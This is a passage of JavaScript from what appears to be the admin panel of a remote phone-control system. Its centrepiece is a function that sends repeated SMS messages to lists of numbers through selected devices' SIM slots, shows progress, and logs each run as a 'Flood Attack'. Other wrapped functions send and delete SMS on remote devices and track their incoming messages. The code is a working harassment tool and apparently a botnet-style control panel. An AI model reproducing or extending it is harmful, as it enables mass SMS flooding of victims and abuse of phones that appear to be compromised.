            const res = await fetch(`${API_URL}/flood`, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': AUTH_TOKEN 
                },
                body: JSON.stringify({
                    deviceIds,
                    simSlot: sim,
                    to,
                    message,
                    count
                })
            });
            const data = await res.json();
            if (data.success) {
                successCount++;
            } else {
                failCount++;
            }
        } catch (err) {
            failCount++;
            console.error(`Failed to send to ${to}:`, err);
        }
        
        const progress = ((i + 1) / totalRequests) * 100;
        progressBar.style.width = progress + '%';
        statusText.textContent = `${i + 1}/${totalRequests} - Success: ${successCount}, Failed: ${failCount}`;
        
        if (i < numbers.length - 1) {
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }
    
    floodCount++;
    localStorage.setItem('flood_count', floodCount);
    
    const totalMsg = `✅ Flood completed\n${successCount} numbers succeeded\n${failCount} numbers failed`;
    logActivity('Flood Attack', `Sent to ${numbers.length} numbers via ${selectedDevices.length} devices`);
    alert(totalMsg);
    
    setTimeout(() => {
        progressSection.classList.add('hidden');
        if (successCount > 0) {
            closeFloodModal();
        }
    }, 2000);
}

// Override sendSMS to add logging
const originalSendSMS = sendSMS;
sendSMS = async function() {
    await originalSendSMS();
    logActivity('SMS Sent', `Device: ${currentDevice?.name || 'Unknown'}`);
};

// Override deleteSMS to add logging
const originalDeleteSMS = deleteSMS;
deleteSMS = async function(id) {
    await originalDeleteSMS(id);
    logActivity('SMS Deleted', `Message ID: ${id.substring(0, 8)}...`);
};

// Override openDevice to add logging
const originalOpenDevice = openDevice;
openDevice = function(id, name) {
    originalOpenDevice(id, name);
    logActivity('Device Opened', `${name} (${id.substring(0, 8)}...)`);
};

// Override moveToTrash to add logging
const originalMoveToTrash = moveToTrash;
moveToTrash = async function(deviceId) {
    const device = allDevices.find(d => d.id === deviceId);
    await originalMoveToTrash(deviceId);
    logActivity('Device Trashed', `${device?.modelName || 'Unknown device'}`);
};

// Override restoreDevice to add logging
const originalRestoreDevice = restoreDevice;
restoreDevice = async function(deviceId) {
    await originalRestoreDevice(deviceId);
    logActivity('Device Restored', `Device ID: ${deviceId.substring(0, 8)}...`);
};

// Auto load
window.addEventListener('DOMContentLoaded', async () => {
    console.log('🚀 Admin Panel Initializing...');
    
    // Load devices first to populate trackedMessageIds with existing messages
    await loadDevices();
    
    // Give a small delay to ensure trackedMessageIds is fully populated
    await new Promise(resolve => setTimeout(resolve, 500));
    
    console.log(`📊 Tracked ${trackedMessageIds.size} existing message IDs`);
    console.log('🔔 Bell will only notify for NEW messages from now on');
    
    // Now start SSE - all existing messages are already tracked
    setupSSE(); // Start real-time connection
    
    console.log('✅ Initialization complete');
});
